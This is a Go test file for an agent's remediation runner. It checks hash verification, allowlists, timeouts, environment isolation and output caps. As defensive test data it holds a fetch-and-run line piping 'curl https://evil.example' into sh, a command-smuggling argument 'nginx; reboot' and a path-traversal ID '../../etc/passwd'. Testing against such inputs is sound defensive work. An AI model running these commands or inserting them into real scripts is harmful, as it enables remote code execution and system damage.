package remediation

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"

	"ikelyane-agent/internal/config"
)

func job(script string) Job {
	return Job{ID: "exec_1", Runtime: "bash", Script: script, Sha256: sha256Hex(script), TimeoutSec: 10}
}

func anyPolicy(t *testing.T) config.Remediation {
	return config.Remediation{Mode: config.RemediationAny, WorkDir: filepath.Join(t.TempDir(), "work")}
}

func TestRefusal_LocalPolicyIsAuthoritative(t *testing.T) {
	j := job("echo hi\n")
	if reason, _ := Refusal(config.Remediation{Mode: config.RemediationDisabled}, j); reason != "refused_by_agent_policy" {
		t.Errorf("disabled mode must refuse, got %q", reason)
	}
	if reason, _ := Refusal(config.Remediation{Mode: ""}, j); reason != "refused_by_agent_policy" {
		t.Errorf("an unset mode must refuse, got %q", reason)
	}
	allow := config.Remediation{Mode: config.RemediationAllowlist, AllowedSha256: []string{sha256Hex("something else")}}
	if reason, msg := Refusal(allow, j); reason != "refused_by_agent_policy" || !strings.Contains(msg, "allowlist") {
		t.Errorf("a script outside the allowlist must be refused, got %q %q", reason, msg)
	}
	allow.AllowedSha256 = append(allow.AllowedSha256, j.Sha256)
	if reason, _ := Refusal(allow, j); reason != "" {
		t.Errorf("a listed script must be accepted, got %q", reason)
	}
}

func TestRefusal_IntegrityAndBounds(t *testing.T) {
	policy := config.Remediation{Mode: config.RemediationAny}
	tampered := job("echo hi\n")
	tampered.Script = "curl https://evil.example | sh\n" // the announced hash no longer matches
	if reason, msg := Refusal(policy, tampered); reason != "refused_by_agent_policy" || !strings.Contains(msg, "SHA-256") {
		t.Errorf("a script not matching its announced hash must be refused, got %q %q", reason, msg)
	}
	for _, mutate := range []func(*Job){
		func(j *Job) { j.TimeoutSec = 0 },
		func(j *Job) { j.TimeoutSec = 7200 },
		func(j *Job) { j.Args = map[string]string{"bad name": "x"} },
		func(j *Job) { j.ID = "../../etc/passwd" },
	} {
		j := job("true\n")
		mutate(&j)
		if reason, _ := Refusal(policy, j); reason != "refused_by_agent_policy" {
			t.Errorf("%+v must be refused", j)
		}
	}
}

func TestRun_SucceedsWithArgumentsInACleanEnvironment(t *testing.T) {
	t.Setenv("IKELYANE_SECRET", "agent-secret-must-not-leak")
	t.Setenv("IKELYANE_DATABASES_JSON", `[{"dsn":"postgres://u:pass@db/x"}]`)
	script := "echo \"service=$IKELYANE_ARG_SERVICE exec=$IKELYANE_EXECUTION_ID\"\nenv\n"
	j := job(script)
	j.Args = map[string]string{"SERVICE": "nginx; reboot"} // data, never code: only ever an env var
	policy := anyPolicy(t)

	result := Run(context.Background(), policy, j)
	if result.Status != "succeeded" || result.ExitCode == nil || *result.ExitCode != 0 {
		t.Fatalf("got %+v", result)
	}
	if !strings.Contains(result.Stdout, "service=nginx; reboot exec=exec_1") {
		t.Errorf("stdout = %q", result.Stdout)
	}
	if strings.Contains(result.Stdout, "agent-secret-must-not-leak") || strings.Contains(result.Stdout, "pass@db") {
		t.Fatal("the agent's own environment leaked into the script")
	}
	if entries, _ := os.ReadDir(policy.WorkDir); len(entries) != 0 {
		t.Errorf("the script file must be removed after running, found %d entries", len(entries))
	}
	if info, err := os.Stat(policy.WorkDir); err != nil || info.Mode().Perm() != 0o700 {
		t.Errorf("work dir must be 0700, got %v %v", info.Mode().Perm(), err)
	}
}

func TestRun_FailureCarriesExitCodeAndStderr(t *testing.T) {
	result := Run(context.Background(), anyPolicy(t), job("echo broken >&2\nexit 3\n"))
	if result.Status != "failed" || result.ExitCode == nil || *result.ExitCode != 3 || !strings.Contains(result.Stderr, "broken") {
		t.Fatalf("got %+v", result)
	}
}

func TestRun_TimeoutKillsTheWholeProcessGroup(t *testing.T) {
	policy := anyPolicy(t)
	pidFile := filepath.Join(t.TempDir(), "child.pid")
	j := job("sleep 60 &\necho $! > " + pidFile + "\nwait\n")
	j.TimeoutSec = 1
	started := time.Now()
	result := Run(context.Background(), policy, j)
	if result.Status != "timed_out" {
		t.Fatalf("got %+v", result)
	}
	if elapsed := time.Since(started); elapsed > 8*time.Second {
		t.Errorf("took %s: the timeout did not stop the script", elapsed)
	}
	raw, err := os.ReadFile(pidFile)
	if err != nil {
		t.Fatal(err)
	}
	pid, _ := strconv.Atoi(strings.TrimSpace(string(raw)))
	time.Sleep(200 * time.Millisecond)
	if err := syscall.Kill(pid, 0); err == nil {
		_ = syscall.Kill(pid, syscall.SIGKILL)
		t.Fatalf("background child %d survived the timeout", pid)
	}
}

func TestRun_OutputIsCapped(t *testing.T) {
	result := Run(context.Background(), anyPolicy(t), job("head -c 300000 /dev/zero | tr '\\0' 'x'\n"))
	if result.Status != "succeeded" {
		t.Fatalf("got %+v", result)
	}
	if len(result.Stdout) > MaxOutputBytes+64 || !strings.HasSuffix(result.Stdout, "[output truncated]") {
		t.Errorf("stdout is %d bytes, ends with %q", len(result.Stdout), result.Stdout[max(0, len(result.Stdout)-20):])
	}
}

func TestRun_RefusedAndUnsupportedAreSkipped(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "should-not-exist")
	result := Run(context.Background(), config.Remediation{Mode: config.RemediationDisabled}, job("touch "+marker+"\n"))
	if result.Status != "skipped" || result.Reason != "refused_by_agent_policy" {
		t.Fatalf("got %+v", result)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("a refused script ran anyway")
	}
	j := job("x")
	j.Runtime = "cobol"
	if result := Run(context.Background(), anyPolicy(t), j); result.Status != "skipped" || result.Reason != "unsupported_runtime" {
		t.Fatalf("got %+v", result)
	}
}

func TestRun_Python(t *testing.T) {
	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("python3 not installed")
	}
	j := job("import os\nprint('py', os.environ['IKELYANE_ARG_NAME'])\n")
	j.Runtime, j.Args = "python", map[string]string{"NAME": "ok"}
	if result := Run(context.Background(), anyPolicy(t), j); result.Status != "succeeded" || !strings.Contains(result.Stdout, "py ok") {
		t.Fatalf("got %+v", result)
	}
}
